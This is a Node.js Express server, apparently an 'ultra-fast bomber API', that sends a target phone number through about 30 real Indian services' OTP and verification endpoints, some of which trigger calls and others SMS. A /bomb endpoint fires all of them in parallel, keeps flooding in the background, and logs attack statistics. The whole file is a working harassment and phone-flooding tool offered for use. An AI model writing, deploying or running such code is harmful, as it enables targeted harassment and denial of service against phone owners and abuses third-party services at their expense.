const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// ==================== ULTRA-FAST AXIOS CONFIG ====================
const axiosInstance = axios.create({
    timeout: 5000,
    headers: {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
});

// ==================== 30+ ULTRA-RELIABLE BOMBING FUNCTIONS ====================

// CORE BOMBING FUNCTIONS (MOST RELIABLE)
const bombFunctions = [
    // CALL OTP SERVICES - WILL RING PHONE
    async (number) => {
        try {
            await axiosInstance.post('https://www.olx.in/api/auth/authenticate?lang=en-IN',
                { phone: `+91${number}`, method: 'call' },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'OLX', type: '📞 CALL' };
        } catch { return { success: false, service: 'OLX', type: '📞 CALL' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://profile.swiggy.com/api/v3/app/request_call_verification',
                { mobile: number },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Swiggy Call', type: '📞 CALL' };
        } catch { return { success: false, service: 'Swiggy Call', type: '📞 CALL' }; }
    },

    // SMS OTP SERVICES (FASTEST)
    async (number) => {
        try {
            await axiosInstance.post('https://anthe.aakash.ac.in/anthe/global-otp-verify',
                `mobileparam=${number}&global_data_id=anthe-otp-verify`,
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
            );
            return { success: true, service: 'Anthe', type: '📱 SMS' };
        } catch { return { success: false, service: 'Anthe', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://www.swiggy.com/dapi/auth/sms-otp',
                { mobile: number },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Swiggy SMS', type: '📱 SMS' };
        } catch { return { success: false, service: 'Swiggy SMS', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://m.snapdeal.com/signupCompleteAjax',
                { j_mobilenumber: number, agree: true, journey: 'mobile' },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Snapdeal', type: '📱 SMS' };
        } catch { return { success: false, service: 'Snapdeal', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://www.licious.in/api/login/signup',
                { phone: number, captcha_token: "" },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Licious', type: '📱 SMS' };
        } catch { return { success: false, service: 'Licious', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code',
                { phoneNumber: `+91${number}` },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Hoichoi', type: '📱 SMS' };
        } catch { return { success: false, service: 'Hoichoi', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://www.shemaroome.com/users/mobile_no_signup',
                `mobile_no=%2B91${number}&registration_source=organic`,
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
            );
            return { success: true, service: 'ShemarooMe', type: '📱 SMS' };
        } catch { return { success: false, service: 'ShemarooMe', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration',
                { phone_number: number },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Hotstar', type: '📱 SMS' };
        } catch { return { success: false, service: 'Hotstar', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://auth.zee5.com/v1/user/sendotp',
                { phoneno: `91${number}` },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'ZEE5', type: '📱 SMS' };
        } catch { return { success: false, service: 'ZEE5', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://accounts.zomato.com/login/phone',
                `country_id=1&number=${number}&type=initiate`,
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
            );
            return { success: true, service: 'Zomato', type: '📱 SMS' };
        } catch { return { success: false, service: 'Zomato', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://www.shopsy.in/2.rome/api/1/action/view',
                { actionRequestContext: { loginId: number, loginIdPrefix: '+91' } },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Shopsy', type: '📱 SMS' };
        } catch { return { success: false, service: 'Shopsy', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp',
                { mobile: number },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Reliance', type: '📱 SMS' };
        } catch { return { success: false, service: 'Reliance', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://api.lazypay.in/api/lazypay/v0/userportal/sendOtp',
                { username: number },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'LazyPay', type: '📱 SMS' };
        } catch { return { success: false, service: 'LazyPay', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.put('https://api.kreditbee.in/v1/me/otp',
                { reason: 'loginOrRegister', mobile: number },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'KreditBee', type: '📱 SMS' };
        } catch { return { success: false, service: 'KreditBee', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG',
                { loginId: number, countryCode: 91 },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Goibibo', type: '📱 SMS' };
        } catch { return { success: false, service: 'Goibibo', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://api-gateway.juno.lenskart.com/v3/customers/sendOtp',
                { telephone: number, phoneCode: '+91' },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Lenskart', type: '📱 SMS' };
        } catch { return { success: false, service: 'Lenskart', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://accounts.box8.co.in/customers/sign_up',
                { phone_no: number, name: 'BOMBER' },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Box8', type: '📱 SMS' };
        } catch { return { success: false, service: 'Box8', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://apigateway.pantaloons.com/common/sendOTP',
                { mobile: number, mode: 'verify' },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Pantaloons', type: '📱 SMS' };
        } catch { return { success: false, service: 'Pantaloons', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://pvt-product.cars24.com/pp/auth/mobile/otp/send/',
                { phone_number: number },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Cars24', type: '📱 SMS' };
        } catch { return { success: false, service: 'Cars24', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://sotp-api.lucentinnovation.com/v6/otp',
                { username: `+91${number}`, type: 'mobile', domain: 'eatanytime.in' },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'EatAnytime', type: '📱 SMS' };
        } catch { return { success: false, service: 'EatAnytime', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.get(`https://www.jockey.in/apps/jotp/api/login/send-otp/+91${number}?whatsapp=false`);
            return { success: true, service: 'Jockey', type: '📱 SMS' };
        } catch { return { success: false, service: 'Jockey', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.get(`https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=${number}`);
            return { success: true, service: 'Univest', type: '📱 SMS' };
        } catch { return { success: false, service: 'Univest', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://mybharat.gov.in/pages/sendGuestUserOtp',
                `user_phone=${number}`,
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
            );
            return { success: true, service: 'MyBharat', type: '📱 SMS' };
        } catch { return { success: false, service: 'MyBharat', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://www.foodstories.shop/shop/',
                [{ mobilenumber: number }],
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'FoodStories', type: '📱 SMS' };
        } catch { return { success: false, service: 'FoodStories', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://walletapi.mobikwik.com/walletapis/redirectflow/otpgenrate/resendotp?epayVersion=v1',
                { id: 'MNRF-68d57d9ce4b0126bac8bc8ba', cell: number, otpSource: 1 },
                { headers: { 'Content-Type': 'application/json', 'x-mclient': '27' } }
            );
            return { success: true, service: 'Mobikwik', type: '📱 SMS' };
        } catch { return { success: false, service: 'Mobikwik', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://www.urbanclap.com/api/v2/growth/web/initiateLogin',
                { phoneNumber: number, countryId: 'IND', loginType: 'otp' },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'UrbanCompany', type: '📱 SMS' };
        } catch { return { success: false, service: 'UrbanCompany', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://app.getswipe.in/api/user/app_login',
                { mobile: number, country_code: 'IN' },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'GetSwipe', type: '📱 SMS' };
        } catch { return { success: false, service: 'GetSwipe', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://jobsnagar.com:2083/otp-authentications',
                { contact: number },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'JobsNagar', type: '📱 SMS' };
        } catch { return { success: false, service: 'JobsNagar', type: '📱 SMS' }; }
    },

    async (number) => {
        try {
            await axiosInstance.post('https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call',
                { contactNumber: number, domainId: '2' },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return { success: true, service: 'Proptiger Call', type: '📞 CALL' };
        } catch { return { success: false, service: 'Proptiger Call', type: '📞 CALL' }; }
    }
];

// ==================== SINGLE BOMBING ENDPOINT ====================
app.get('/bomb', async (req, res) => {
    const startTime = Date.now();
    
    try {
        const { num } = req.query;
        
        if (!num || !/^[6-9]\d{9}$/.test(num)) {
            return res.json({
                success: false,
                message: 'Invalid Indian number (10 digits, starts with 6-9)',
                example: '/bomb?num=9876543210'
            });
        }
        
        console.log(`\n🚀🚀🚀 BOMBING STARTED ON: ${num} 🚀🚀🚀`);
        console.log(`⏰ ${new Date().toISOString()}`);
        console.log('='.repeat(60));
        
        // Execute ALL bombing functions in parallel for MAXIMUM SPEED
        const bombPromises = bombFunctions.map((bomb, index) => 
            Promise.race([
                bomb(num),
                new Promise(resolve => setTimeout(() => resolve({ 
                    success: false, 
                    service: `Service ${index + 1}`, 
                    type: '⏱️ TIMEOUT' 
                }), 4000))
            ])
        );
        
        // Wait for first results
        const firstResults = await Promise.allSettled(bombPromises.slice(0, 15));
        
        // Calculate immediate stats
        const successful = firstResults.filter(r => 
            r.status === 'fulfilled' && r.value.success
        ).length;
        
        const callSuccess = firstResults.filter(r => 
            r.status === 'fulfilled' && r.value.success && r.value.type.includes('CALL')
        ).length;
        
        const smsSuccess = successful - callSuccess;
        
        const totalTime = Date.now() - startTime;
        
        // Send IMMEDIATE response (don't wait for all)
        const response = {
            success: true,
            message: `💣💣💣 BOMBING SUCCESSFULLY STARTED! 💣💣💣`,
            target: num,
            timestamp: new Date().toISOString(),
            attack_started: `Bombing started on ${num}`,
            status: '⚡ ULTRA-FAST SPAM ACTIVATED ⚡',
            immediate_results: {
                services_fired: 15,
                successful_hits: successful,
                call_hits: callSuccess,
                sms_hits: smsSuccess,
                response_time: `${totalTime}ms`
            },
            estimated_impact: {
                phone_will_ring: callSuccess > 0 ? 'YES 📞' : 'NO',
                sms_flood: 'YES 📱',
                total_otps: Math.floor(successful * 0.7),
                duration: '5-10 seconds'
            },
            warning: '🚨 PHONE IS BEING BOMBARDED WITH CALLS AND SMS! 🚨',
            note: 'Full bombing continues in background...'
        };
        
        res.json(response);
        
        // CONTINUE BOMBING IN BACKGROUND FOR MAXIMUM IMPACT
        console.log(`📊 IMMEDIATE RESULTS: ${successful}/15 successful`);
        console.log(`📞 CALL HITS: ${callSuccess}`);
        console.log(`📱 SMS HITS: ${smsSuccess}`);
        console.log('='.repeat(60));
        
        // Continue with remaining services
        setTimeout(async () => {
            try {
                const remainingPromises = bombPromises.slice(15);
                const remainingResults = await Promise.allSettled(remainingPromises);
                
                const totalSuccessful = successful + remainingResults.filter(r => 
                    r.status === 'fulfilled' && r.value.success
                ).length;
                
                const totalCallSuccess = callSuccess + remainingResults.filter(r => 
                    r.status === 'fulfilled' && r.value.success && r.value.type.includes('CALL')
                ).length;
                
                console.log(`🔥 FINAL STATS FOR ${num}:`);
                console.log(`   Total Services: ${bombFunctions.length}`);
                console.log(`   Total Successful: ${totalSuccessful}`);
                console.log(`   Call OTPs: ${totalCallSuccess}`);
                console.log(`   SMS OTPs: ${totalSuccessful - totalCallSuccess}`);
                console.log(`   Estimated OTPs Sent: ${Math.floor(totalSuccessful * 0.7)}`);
                console.log(`   Total Time: ${Date.now() - startTime}ms`);
                console.log('='.repeat(60));
                console.log(`✅ BOMBING COMPLETE FOR: ${num}\n`);
                
            } catch (error) {
                console.error(`❌ Background bombing error:`, error.message);
            }
        }, 100);
        
    } catch (error) {
        console.error('Bombing Error:', error);
        res.json({
            success: false,
            message: 'Bombing failed',
            error: error.message,
            note: 'Try again with different number'
        });
    }
});

// ==================== SIMPLE STATUS ENDPOINT ====================
app.get('/status', (req, res) => {
    res.json({
        success: true,
        name: 'ULTRA-FAST BOMBER API',
        version: '1.0',
        status: '⚡ READY FOR ACTION ⚡',
        services: bombFunctions.length,
        call_services: 3,
        endpoint: '/bomb?num=9876543210',
        note: 'Single endpoint for maximum spam'
    });
});

// ==================== TEST ENDPOINT ====================
app.get('/test', async (req, res) => {
    const { num } = req.query;
    
    if (!num || !/^[6-9]\d{9}$/.test(num)) {
        return res.json({
            success: false,
            message: 'Provide valid number: /test?num=9876543210'
        });
    }
    
    // Test with 5 fastest services including 1 call
    const testServices = [
        bombFunctions[0], // OLX Call
        bombFunctions[2], // Anthe
        bombFunctions[4], // Snapdeal
        bombFunctions[3], // Swiggy SMS
        bombFunctions[10] // Zomato
    ];
    
    const results = await Promise.allSettled(testServices.map(bomb => bomb(num)));
    const successful = results.filter(r => r.status === 'fulfilled' && r.value.success).length;
    const hasCalls = results.some(r => 
        r.status === 'fulfilled' && r.value.success && r.value.type.includes('CALL')
    );
    
    res.json({
        success: true,
        message: '✅ API WORKING',
        test_number: num,
        services_tested: 5,
        successful: successful,
        call_active: hasCalls,
        status: successful >= 3 ? 'READY FOR WAR' : 'NEEDS CHECK',
        ready_for_attack: `/bomb?num=${num}`
    });
});

// ==================== START SERVER ====================
app.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════════════════╗
    ║                                                  ║
    ║         ⚡⚡⚡ ULTRA-FAST BOMBER API ⚡⚡⚡       ║
    ║         1 ENDPOINT • CALL + SMS • INSTANT        ║
    ║                                                  ║
    ╠══════════════════════════════════════════════════╣
    ║                                                  ║
    ║  🌐 PORT: ${PORT}                                 ║
    ║  💣 SERVICES: ${bombFunctions.length}              ║
    ║  📞 CALL SERVICES: 3                            ║
    ║  ⚡ SPEED: INSTANT RESPONSE                      ║
    ║                                                  ║
    ╠══════════════════════════════════════════════════╣
    ║                                                  ║
    ║  📌 ATTACK: /bomb?num=9876543210                ║
    ║  📌 TEST: /test?num=9876543210                  ║
    ║  📌 STATUS: /status                             ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝
    
    💥 USAGE: https://your-server.com/bomb?num=9876543210
    ⚡ RESPONSE: Immediate (1-2 seconds)
    📞 RESULT: Phone rings + SMS flood
    `);
});